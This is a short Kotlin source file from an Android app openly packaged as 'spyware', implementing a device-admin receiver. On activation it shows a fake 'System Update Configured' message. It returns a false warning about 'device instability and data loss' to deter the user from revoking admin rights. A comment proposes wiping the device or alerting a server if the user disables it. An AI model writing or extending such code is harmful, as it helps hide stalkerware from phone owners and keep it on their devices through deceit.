package com.example.spyware

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import android.widget.Toast

class AdminReceiver : DeviceAdminReceiver() {

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        // Device admin enabled. The app is now much harder to uninstall.
        Toast.makeText(context, "System Update Configured", Toast.LENGTH_SHORT).show()
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        // This message pops up when the user tries to revoke admin privileges
        return "Warning: Disabling this system service may cause device instability and data loss."
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        // If they manage to disable it, you could potentially trigger a wipe here 
        // if this was a legitimate enterprise MDM, or alert the server.
    }
}